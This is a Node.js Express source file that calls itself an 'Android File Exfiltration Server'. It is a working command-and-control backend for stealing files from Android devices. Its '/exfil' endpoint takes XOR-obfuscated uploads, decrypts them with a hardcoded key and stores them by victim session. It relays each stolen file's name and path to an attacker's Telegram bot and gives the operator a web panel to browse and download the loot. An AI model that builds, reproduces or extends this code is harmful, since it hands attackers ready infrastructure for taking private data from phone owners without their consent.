const express = require('express');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const axios = require('axios');
const app = express();
const PORT = 3000;

app.use(express.json({ limit: '100mb' }));
app.use(express.urlencoded({ extended: true }));

// Decryption function
function decryptData(encryptedData, key) {
    try {
        const decoded = Buffer.from(encryptedData, 'base64').toString('binary');
        let result = '';
        for (let i = 0; i < decoded.length; i++) {
            const keyChar = key.charCodeAt(i % key.length);
            const dataChar = decoded.charCodeAt(i);
            result += String.fromCharCode(dataChar ^ keyChar);
        }
        return JSON.parse(result);
    } catch (err) {
        return null;
    }
}

// Endpoint utama
app.post('/exfil', async (req, res) => {
    console.log(`[${new Date().toISOString()}] Received request`);
    
    try {
        const { encrypted, metadata } = req.body;
        
        if (!encrypted || !metadata) {
            return res.status(400).send('Bad Request');
        }
        
        // Decrypt data
        const decryptionKey = '6bc1bee22e409f96e93d7e117393172a6bc1bee22e409f96e93d7e117393172a';
        const decrypted = decryptData(encrypted, decryptionKey);
        
        if (!decrypted) {
            console.log('Failed to decrypt data');
            return res.status(400).send('Decryption failed');
        }
        
        // Save to file
        const sessionDir = path.join(__dirname, 'sessions', metadata.sessionId);
        if (!fs.existsSync(sessionDir)) {
            fs.mkdirSync(sessionDir, { recursive: true });
        }
        
        const filename = `${Date.now()}_${metadata.fileName.replace(/[^a-zA-Z0-9]/g, '_')}.json`;
        const filepath = path.join(sessionDir, filename);
        
        fs.writeFileSync(filepath, JSON.stringify({
            metadata: metadata,
            data: decrypted.data,
            receivedAt: new Date().toISOString(),
            sourceIP: req.ip
        }, null, 2));
        
        console.log(`✅ Saved: ${filename} (${metadata.fileSize} bytes)`);
        
        // Forward to Telegram if needed
        if (process.env.TELEGRAM_BOT_TOKEN) {
            await axios.post(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
                chat_id: process.env.TELEGRAM_CHAT_ID,
                text: `📥 New file received\nSession: ${metadata.sessionId}\nFile: ${metadata.fileName}\nSize: ${metadata.fileSize} bytes\nPath: ${metadata.filePath}`,
                parse_mode: 'Markdown'
            });
        }
        
        res.status(200).send('OK');
        
    } catch (error) {
        console.error('Error:', error.message);
        res.status(500).send('Internal Server Error');
    }
});

// Session viewer endpoint
app.get('/sessions/:sessionId', (req, res) => {
    const sessionDir = path.join(__dirname, 'sessions', req.params.sessionId);
    
    if (!fs.existsSync(sessionDir)) {
        return res.status(404).send('Session not found');
    }
    
    const files = fs.readdirSync(sessionDir);
    const sessionData = files.map(file => {
        const content = JSON.parse(fs.readFileSync(path.join(sessionDir, file), 'utf8'));
        return {
            file: file,
            metadata: content.metadata,
            receivedAt: content.receivedAt,
            dataPreview: content.data.substring(0, 200) + '...'
        };
    });
    
    res.json(sessionData);
});

// Download endpoint
app.get('/download/:sessionId/:filename', (req, res) => {
    const filepath = path.join(__dirname, 'sessions', req.params.sessionId, req.params.filename);
    
    if (!fs.existsSync(filepath)) {
        return res.status(404).send('File not found');
    }
    
    res.download(filepath);
});

app.get('/', (req, res) => {
    res.send(`
        <html>
            <body>
                <h1>Android File Exfiltration Server</h1>
                <p>Active sessions:</p>
                <ul>
                    ${fs.readdirSync(path.join(__dirname, 'sessions')).map(dir => 
                        `<li><a href="/sessions/${dir}">${dir}</a></li>`
                    ).join('')}
                </ul>
            </body>
        </html>
    `);
});

app.listen(PORT, () => {
    console.log(`🚀 Advanced server running on port ${PORT}`);
    console.log(`📁 Endpoint: http://localhost:${PORT}/exfil`);
    console.log(`📁 Sessions: http://localhost:${PORT}/`);
});
